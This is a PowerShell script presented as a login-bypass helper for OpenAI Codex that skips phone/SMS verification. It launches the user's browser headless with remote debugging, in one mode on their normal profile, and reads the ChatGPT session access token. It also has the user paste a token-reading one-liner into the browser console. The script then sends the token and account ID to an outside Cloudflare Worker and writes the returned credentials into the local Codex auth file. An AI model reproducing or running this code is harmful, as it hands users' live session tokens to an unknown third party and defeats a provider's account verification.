# PowerShell Codex Auth Sync Helper
# Native, lightweight replacement for the compiled .exe file.
# Scans browsers, retrieves ChatGPT session, and syncs via Cloudflare Worker.

$ErrorActionPreference = "Stop"

# Force console to output UTF-8 to avoid encoding issues
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

function Show-Banner {
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host "       OpenAI Codex Login Bypass Companion Tool (PS Version)" -ForegroundColor Cyan
    Write-Host "============================================================" -ForegroundColor Cyan
    Write-Host "    Bypassing phone/SMS verification using Cloud authorization" -ForegroundColor Gray
    Write-Host "============================================================" -ForegroundColor Cyan
}

function Scan-Browsers {
    $browsers = New-Object System.Collections.Generic.List[PSObject]
    
    # 1. Check registry on Windows
    if ($IsWindows -or $env:OS -eq "Windows_NT") {
        $regKeysToCheck = @(
            @("Google Chrome", "chrome.exe"),
            @("Microsoft Edge", "msedge.exe"),
            @("360 Secure Browser", "360se.exe"),
            @("360 Extreme Browser", "360chrome.exe"),
            @("QQ Browser", "qqbrowser.exe"),
            @("Brave Browser", "brave.exe"),
            @("Opera Browser", "opera.exe"),
            @("Vivaldi Browser", "vivaldi.exe")
        )
        
        foreach ($item in $regKeysToCheck) {
            $name = $item[0]
            $exe = $item[1]
            $path = "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\$exe"
            
            foreach ($hive in @("HKLM", "HKCU")) {
                $regKey = "${hive}:\$path"
                if (Test-Path $regKey) {
                    try {
                        $val = (Get-ItemProperty -Path $regKey -Name "")."(default)"
                        if ($val) {
                            $cleanPath = $val.Trim().Trim('"').Trim("'").Trim()
                            if ($cleanPath -and (Test-Path $cleanPath)) {
                                $browsers.Add([PSCustomObject]@{ Name = $name; Path = $cleanPath })
                                break
                            }
                        }
                    } catch {}
                }
            }
        }
    }
    
    # 2. Check fallback standard paths
    $fallbacks = @(
        @("Google Chrome", "D:\Program Files\Google\Chrome\Application\chrome.exe"),
        @("Google Chrome", "D:\Program Files (x86)\Google\Chrome\Application\chrome.exe"),
        @("Google Chrome", "C:\Program Files\Google\Chrome\Application\chrome.exe"),
        @("Google Chrome", "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"),
        @("Google Chrome", "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"),
        
        @("Microsoft Edge", "D:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
        @("Microsoft Edge", "D:\Program Files\Microsoft\Edge\Application\msedge.exe"),
        @("Microsoft Edge", "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
        @("Microsoft Edge", "C:\Program Files\Microsoft\Edge\Application\msedge.exe"),
        @("Microsoft Edge", "$env:LOCALAPPDATA\Microsoft\Edge\Application\msedge.exe"),
        
        @("360 Secure Browser", "C:\Program Files (x86)\360\360se6\Application\360se.exe"),
        @("360 Secure Browser", "C:\Program Files\360\360se6\Application\360se.exe"),
        @("360 Secure Browser", "$env:APPDATA\360se6\Application\360se.exe"),
        
        @("360 Extreme Browser", "C:\Program Files (x86)\360\360chrome\Application\360chrome.exe"),
        @("360 Extreme Browser", "C:\Program Files\360\360chrome\Application\360chrome.exe"),
        @("360 Extreme Browser", "$env:LOCALAPPDATA\360Chrome\Chrome\Application\360chrome.exe"),
        
        @("QQ Browser", "C:\Program Files (x86)\Tencent\QQBrowser\QQBrowser.exe"),
        @("QQ Browser", "C:\Program Files\Tencent\QQBrowser\QQBrowser.exe"),
        @("QQ Browser", "$env:LOCALAPPDATA\Tencent\QQBrowser\Application\QQBrowser.exe")
    )
    
    $foundNames = $browsers | ForEach-Object { $_.Name }
    foreach ($item in $fallbacks) {
        $name = $item[0]
        $path = $item[1]
        if ($name -notin $foundNames -and $path -and (Test-Path $path)) {
            $browsers.Add([PSCustomObject]@{ Name = $name; Path = $path })
            $foundNames += $name
        }
    }
    
    return $browsers
}

function Evaluate-JS {
    param(
        [string]$wsUrl,
        [string]$expression
    )
    
    $uri = [System.Uri]$wsUrl
    $port = if ($uri.Port -eq -1) { 80 } else { $uri.Port }
    
    $client = New-Object System.Net.Sockets.TcpClient($uri.Host, $port)
    $stream = $client.GetStream()
    
    # WebSocket Handshake
    $key = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("dGhlIHNhbXBsZSBub25jZQ=="))
    $handshake = "GET $($uri.PathAndQuery) HTTP/1.1`r`n" +
                 "Host: $($uri.Host)`r`n" +
                 "Upgrade: websocket`r`n" +
                 "Connection: Upgrade`r`n" +
                 "Sec-WebSocket-Key: $key`r`n" +
                 "Sec-WebSocket-Version: 13`r`n`r`n"
                 
    $handshakeBytes = [Text.Encoding]::ASCII.GetBytes($handshake)
    $stream.Write($handshakeBytes, 0, $handshakeBytes.Length)
    
    $buffer = New-Object byte[] 4096
    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
    $response = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
    if ($response -notmatch "101 Switching Protocols") {
        $client.Close()
        throw "WebSocket Handshake failed"
    }
    
    # Send Runtime.evaluate command
    $cmdObj = @{
        id = 1
        method = "Runtime.evaluate"
        params = @{
            expression = $expression
            awaitPromise = $true
            returnByValue = $true
        }
    }
    $cmdJson = $cmdObj | ConvertTo-Json -Compress
    $payloadBytes = [Text.Encoding]::UTF8.GetBytes($cmdJson)
    $len = $payloadBytes.Length
    
    $frame = New-Object System.Collections.Generic.List[byte]
    $frame.Add(0x81) # Text frame, FIN
    
    if ($len -le 125) {
        $frame.Add($len -bor 0x80) # Masked (client -> server MUST mask)
    } elseif ($len -le 65535) {
        $frame.Add(126 -bor 0x80)
        $frame.Add(($len -shr 8) -band 0xff)
        $frame.Add($len -band 0xff)
    }
    
    # Mask key
    $mask = @(0x01, 0x02, 0x03, 0x04)
    $frame.AddRange($mask)
    
    # Mask payload
    for ($i = 0; $i -lt $len; $i++) {
        $frame.Add($payloadBytes[$i] -bxor $mask[$i % 4])
    }
    
    $frameBytes = $frame.ToArray()
    $stream.Write($frameBytes, 0, $frameBytes.Length)
    
    # Read response
    $dataList = New-Object System.Collections.Generic.List[byte]
    $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
    $dataList.AddRange($buffer[0..($bytesRead-1)])
    
    while ($dataList.Count -lt 2) {
        $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
        $dataList.AddRange($buffer[0..($bytesRead-1)])
    }
    
    $payloadLen = $dataList[1] -band 0x7f
    $offset = 2
    if ($payloadLen -eq 126) {
        while ($dataList.Count -lt 4) {
            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
            $dataList.AddRange($buffer[0..($bytesRead-1)])
        }
        $payloadLen = ($dataList[2] -shl 8) + $dataList[3]
        $offset = 4
    }
    
    while ($dataList.Count -lt ($offset + $payloadLen)) {
        $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
        $dataList.AddRange($buffer[0..($bytesRead-1)])
    }
    
    $client.Close()
    
    $payloadBytes = $dataList.ToArray()[$offset..($offset + $payloadLen - 1)]
    $resJson = [Text.Encoding]::UTF8.GetString($payloadBytes)
    return $resJson | ConvertFrom-Json
}

function Extract-AccountId {
    param([string]$token)
    try {
        $parts = $token.Split('.')
        if ($parts.Length -eq 3) {
            $payloadB64 = $parts[1]
            $padding = 4 - ($payloadB64.Length % 4)
            if ($padding -ne 4) {
                $payloadB64 += "=" * $padding
            }
            # Replace URL-safe base64 chars
            $payloadB64 = $payloadB64.Replace('-', '+').Replace('_', '/')
            $bytes = [Convert]::FromBase64String($payloadB64)
            $payloadStr = [Text.Encoding]::UTF8.GetString($bytes)
            $payload = $payloadStr | ConvertFrom-Json
            return $payload."https://api.openai.com/auth".chatgpt_account_id
        }
    } catch {}
    return ""
}

function Check-ExistingSession {
    param(
        [string]$browserPath,
        [string]$userDir,
        [int]$port
    )
    
    $args = @(
        "--remote-debugging-port=$port",
        "--user-data-dir=$userDir",
        "--no-first-run",
        "--no-default-browser-check",
        "--headless",
        "https://chatgpt.com/"
    )
    
    $proc = Start-Process -FilePath $browserPath -ArgumentList $args -PassThru -WindowStyle Hidden
    Start-Sleep -Seconds 2
    
    $wsUrl = $null
    for ($i = 0; $i -lt 5; $i++) {
        try {
            $targets = Invoke-RestMethod -Uri "http://127.0.0.1:$port/json" -UseBasicParsing
            foreach ($t in $targets) {
                if ($t.type -eq "page" -and $t.url -like "*chatgpt.com*") {
                    $wsUrl = $t.webSocketDebuggerUrl
                    break
                }
            }
            if ($wsUrl) { break }
        } catch {}
        Start-Sleep -Milliseconds 500
    }
    
    $token = $null
    if ($wsUrl) {
        $js = "fetch('/api/auth/session').then(r=>r.json()).then(d=>d.accessToken?{success:true,t:d.accessToken}:{success:false}).catch(e=>{success:false})"
        try {
            $res = Evaluate-JS -wsUrl $wsUrl -expression $js
            $val = $res.result.result.value
            if ($val.success) {
                $token = $val.t
            }
        } catch {}
    }
    
    # Terminate process
    try {
        $proc | Stop-Process -Force -ErrorAction SilentlyContinue
    } catch {}
    
    return $token
}

function Run-LoginBypass {
    param($authData)
    
    $codexDir = Join-Path $env:USERPROFILE ".codex"
    if (-not (Test-Path $codexDir)) {
        New-Item -ItemType Directory -Path $codexDir -Force | Out-Null
    }
    
    $authFile = Join-Path $codexDir "auth.json"
    
    # Backup existing auth.json
    if (Test-Path $authFile) {
        $timestamp = (Get-Date).ToString("yyyyMMdd_HHmmss")
        $bakFile = Join-Path $codexDir "auth.json.bak_$timestamp"
        Rename-Item -Path $authFile -NewName (Split-Path $bakFile -Leaf) -Force
    }
    
    # Save authData
    $authData | ConvertTo-Json -Depth 5 | Out-File -FilePath $authFile -Encoding utf8 -Force
    Write-Host "[OK] Config successfully written to: $authFile" -ForegroundColor Green
    
    # Apply local config.toml optimization based on plan type
    try {
        $planType = "free"
        $accessToken = $authData.tokens.access_token
        $parts = $accessToken.Split('.')
        if ($parts.Length -eq 3) {
            $payloadB64 = $parts[1]
            $padding = 4 - ($payloadB64.Length % 4)
            if ($padding -ne 4) { $payloadB64 += "=" * $padding }
            $payloadB64 = $payloadB64.Replace('-', '+').Replace('_', '/')
            $bytes = [Convert]::FromBase64String($payloadB64)
            $payload = ([Text.Encoding]::UTF8.GetString($bytes) | ConvertFrom-Json)
            $planType = $payload."https://api.openai.com/auth".chatgpt_plan_type
        }
        
        $configPath = Join-Path $codexDir "config.toml"
        if (Test-Path $configPath) {
            $lines = Get-Content $configPath
            $newLines = @()
            foreach ($line in $lines) {
                if ($line.Trim() -like "model =*") {
                    if ($planType -eq "free") { $newLines += 'model = "gpt-5-codex-mini"' }
                    else { $newLines += 'model = "gpt-5.5"' }
                } elseif ($line.Trim() -like "model_reasoning_effort =*") {
                    if ($planType -eq "free") { $newLines += 'model_reasoning_effort = "low"' }
                    else { $newLines += 'model_reasoning_effort = "xhigh"' }
                } else {
                    $newLines += $line
                }
            }
            $newLines | Out-File $configPath -Encoding utf8 -Force
            Write-Host "[Auto-Optimize] Detected $planType subscription, automatically optimized config.toml!" -ForegroundColor Gray
        }
    } catch {
        Write-Host "[Auto-Optimize Warn] Auto-optimization of config.toml failed: $_" -ForegroundColor Yellow
    }
}

function Locate-CodexBin {
    $paths = @(
        Join-Path $env:USERPROFILE "AppData\Local\OpenAI\Codex\bin\codex.exe"
    )
    foreach ($p in $paths) {
        if (Test-Path $p) { return $p }
    }
    return $null
}

function Graft-With-Cloudflare {
    param(
        $token,
        $accountId,
        $workerUrl
    )
    
    $graftUrl = "$workerUrl/graft"
    $headers = @{
        "Content-Type" = "application/json"
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    $payload = @{
        access_token = $token
        account_id = $accountId
    } | ConvertTo-Json -Compress
    
    Write-Host "[Auth Graft] Grafting credentials via cloud stateless service..." -ForegroundColor Gray
    try {
        $graftedAuthData = Invoke-RestMethod -Uri $graftUrl -Headers $headers -Method Post -Body $payload -UseBasicParsing
        return $graftedAuthData
    } catch {
        Write-Host "[Error] Credential graft failed: $_" -ForegroundColor Red
        Exit 1
    }
}

# Main Execution Flow
Clear-Host
Show-Banner

Write-Host "Starting one-click login bypass process..." -ForegroundColor Gray

# 1. Scan for browsers
$browsers = Scan-Browsers
if ($browsers.Count -eq 0) {
    Write-Error "Error: Chrome or Edge browser not detected on this system."
    Exit 1
}

Write-Host ""
Write-Host "[System Scan] Detected the following browsers on your system:" -ForegroundColor Gray
for ($i = 0; $i -lt $browsers.Count; $i++) {
    Write-Host "  [$($i + 1)] $($browsers[$i].Name) (Path: $($browsers[$i].Path))" -ForegroundColor Gray
}

$choice = 0
if ($browsers.Count -gt 1) {
    while ($true) {
        $ans = (Read-Host "`nSelect the browser where you logged into ChatGPT (1-$($browsers.Count)) [Default 1]").Trim()
        if (-not $ans) {
            $choice = 0
            break
        }
        if ($ans -as [int]) {
            $idx = [int]$ans - 1
            if ($idx -ge 0 -and $idx -lt $browsers.Count) {
                $choice = $idx
                break
            }
        }
        Write-Host "Invalid input: Please enter a valid number between 1 and $($browsers.Count) ." -ForegroundColor Yellow
    }
} else {
    Write-Host "`nSystem detected a single supported browser, automatically using: $($browsers[0].Name)" -ForegroundColor Gray
}

$browserName = $browsers[$choice].Name
$browserPath = $browsers[$choice].Path
Write-Host "Selected and bound to browser: $browserName" -ForegroundColor Green

$port = 9333
$userDir = Join-Path $env:USERPROFILE ".codex\browser_session"

# 2. Check for existing active session
Write-Host "`n[Auto-Fetch] Checking login status of current browser session..." -ForegroundColor Gray
$token = Check-ExistingSession -browserPath $browserPath -userDir $userDir -port $port


function Get-TokenFromDebugger {
    param([int]$port)
    $wsUrl = $null
    for ($i = 0; $i -lt 10; $i++) {
        try {
            $targets = Invoke-RestMethod -Uri "http://127.0.0.1:$port/json" -UseBasicParsing
            foreach ($t in $targets) {
                if ($t.type -eq "page" -and $t.url -like "*chatgpt.com*") {
                    $wsUrl = $t.webSocketDebuggerUrl
                    break
                }
            }
            if ($wsUrl) { break }
        } catch {}
        Start-Sleep -Milliseconds 500
    }
    if ($wsUrl) {
        $js = "fetch('/api/auth/session').then(r=>r.json()).then(d=>d.accessToken?{success:true,t:d.accessToken}:{success:false}).catch(e=>{success:false})"
        try {
            $res = Evaluate-JS -wsUrl $wsUrl -expression $js
            $val = $res.result.result.value
            if ($val.success) { return $val.t }
        } catch {}
    }
    return $null
}

if (-not $token) {
    Write-Host ""
    Write-Host "============================================================" -ForegroundColor Yellow
    Write-Host " [Wait] ChatGPT anti-bot may block clean login windows." -ForegroundColor Yellow
    Write-Host " How would you like to extract your ChatGPT Token?" -ForegroundColor Yellow
    Write-Host ""
    Write-Host " [1] (Recommended) Auto-Extract from your NORMAL browser profile"
    Write-Host "     Fast and skips login! You must CLOSE your normal browser first."
    Write-Host " [2] Manual Extraction (No need to close browser)"
    Write-Host "     We open a new tab. You copy-paste a 1-line script into F12 Console."
    Write-Host " [3] Clean Window Login (Legacy)"
    Write-Host "     We open an isolated window for you to login (May be blocked by ChatGPT)."
    Write-Host "============================================================" -ForegroundColor Yellow
    
    $extChoice = "1"
    while ($true) {
        $ansExt = (Read-Host "`nSelect extraction method (1/2/3) [Default 1]").Trim()
        if (-not $ansExt) { $extChoice = "1"; break }
        if ($ansExt -match "^[123]$") { $extChoice = $ansExt; break }
    }
    
    if ($extChoice -eq "1") {
        $processName = if ($browserName -like "*Edge*") { "msedge" } elseif ($browserName -like "*360*") { "360se", "360chrome" } elseif ($browserName -like "*QQ*") { "QQBrowser" } else { "chrome" }
        $running = Get-Process -Name $processName -ErrorAction SilentlyContinue
        if ($running) {
            Write-Host "`n[Action Required] Please CLOSE ALL $($browserName) windows to proceed!" -ForegroundColor Red
            Write-Host "Press Enter AFTER you have closed the browser..." -ForegroundColor Yellow
            Read-Host
        }
        Write-Host "`n[Auto-Fetch] Launching normal profile in background..." -ForegroundColor Gray
        $argsDebug = @("--remote-debugging-port=$port", "--headless", "https://chatgpt.com/")
        $procDebug = Start-Process -FilePath $browserPath -ArgumentList $argsDebug -PassThru -WindowStyle Hidden
        Start-Sleep -Seconds 3
        $token = Get-TokenFromDebugger -port $port
        if ($token) { Write-Host "[Auto-Fetch] Successfully retrieved Token!" -ForegroundColor Green }
        try { $procDebug | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
    } elseif ($extChoice -eq "2") {
        Write-Host "`n[Manual Mode] Opening ChatGPT in your browser..." -ForegroundColor Gray
        Start-Process -FilePath $browserPath -ArgumentList "https://chatgpt.com/"
        Write-Host "1. Press F12 to open Developer Tools." -ForegroundColor Yellow
        Write-Host "2. Go to the 'Console' tab." -ForegroundColor Yellow
        Write-Host "3. Paste the following code and press Enter:" -ForegroundColor Yellow
        Write-Host "`n   fetch('/api/auth/session').then(r=>r.json()).then(d=>prompt('Token:',d.accessToken))`n" -ForegroundColor Cyan
        $token = (Read-Host "Paste your Token here").Trim()
    } else {
        Write-Host "`n============================================================" -ForegroundColor Yellow
        Write-Host " [Step 1] Please login to your ChatGPT account in the browser window. (Plus supported)" -ForegroundColor Yellow
        Write-Host " [Step 2] After logging in and entering the chat interface," -ForegroundColor Yellow
        Write-Host "                   please [Manually close the browser window]! Tool will extract Token!" -ForegroundColor Red
        Write-Host "============================================================" -ForegroundColor Yellow
        
        $argsLegacy = @("--user-data-dir=$userDir", "--no-first-run", "--no-default-browser-check", "https://chatgpt.com/")
        $proc = Start-Process -FilePath $browserPath -ArgumentList $argsLegacy -PassThru
        $proc.WaitForExit()
        
        Write-Host "`n[Auto-Fetch] Browser closed. Restarting background service to extract Token..." -ForegroundColor Gray
        $argsDebug = @("--remote-debugging-port=$port", "--user-data-dir=$userDir", "--no-first-run", "--no-default-browser-check", "--headless", "https://chatgpt.com/")
        $procDebug = Start-Process -FilePath $browserPath -ArgumentList $argsDebug -PassThru -WindowStyle Hidden
        Start-Sleep -Seconds 2
        
        $token = Get-TokenFromDebugger -port $port
        if ($token) { Write-Host "[Auto-Fetch] Successfully retrieved Token!" -ForegroundColor Green }
        try { $procDebug | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
    }
}

if (-not $token) {
    Write-Error "Error: Failed to retrieve login credentials. Please ensure you are logged into ChatGPT."
    Exit 1
}

Write-Host "[OK] Token received. Starting graft and sync..." -ForegroundColor Green

$accountId = Extract-AccountId -token $token
$workerUrl = "https://codex-sync-worker.epidemicsituation.workers.dev"
$graftedAuthData = Graft-With-Cloudflare -token $token -accountId $accountId -workerUrl $workerUrl
Run-LoginBypass -authData $graftedAuthData

$codexPath = Locate-CodexBin
if ($codexPath) {
    Write-Host ""
    $ans = (Read-Host "Launch Codex desktop app now? (Y/n)").Trim().ToLower()
    if ($ans -eq "y" -or $ans -eq "yes" -or -not $ans) {
        Write-Host "[Launch] Starting Codex..." -ForegroundColor Gray
        Start-Process -FilePath $codexPath -ArgumentList "app"
        Write-Host "[Success] Codex started." -ForegroundColor Green
    }
} else {
    Write-Host "`n[Note] Credentials updated. Codex not found at default install path." -ForegroundColor Gray
}

Write-Host ""
Write-Host "============================================================" -ForegroundColor Green
Write-Host "         Sync complete. Window closes in 3 seconds" -ForegroundColor Green
Write-Host "============================================================" -ForegroundColor Green
Start-Sleep -Seconds 3
